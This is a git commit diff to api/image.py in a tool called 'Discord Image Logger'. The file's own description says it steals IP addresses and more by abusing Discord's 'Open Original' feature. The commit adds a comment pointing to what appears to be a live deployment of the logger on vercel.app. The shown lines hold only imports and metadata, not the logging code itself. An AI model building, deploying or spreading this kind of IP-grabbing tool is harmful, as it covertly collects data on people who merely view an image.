e4d6fef307e187b51a4066e33c97f260552923a2
y-o1 <tadui@tadui.de>
2026-02-24 00:20:57 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -2,6 +2,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
+#Website is https://tenor-three-pied.vercel.app/api/image
+
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
